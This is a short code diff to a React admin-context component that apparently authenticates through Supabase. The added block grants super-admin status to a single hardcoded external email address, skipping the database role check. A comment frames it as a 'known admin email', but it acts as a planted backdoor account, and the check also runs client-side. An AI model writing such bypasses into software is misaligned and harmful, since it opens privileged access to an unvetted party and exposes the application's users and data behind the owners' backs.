@@ -49,6 +49,12 @@ export function AdminProvider({ children }) {
         navigate("/auth");
         return;
       }
+      // Grant admin access for known admin emails
+      if (user.email === "kalitest928ya@gmail.com") {
+        setIsSuperAdmin(true);
+        fetchData();
+        return;
+      }
       supabase
         .from("user_roles")
         .select("role")
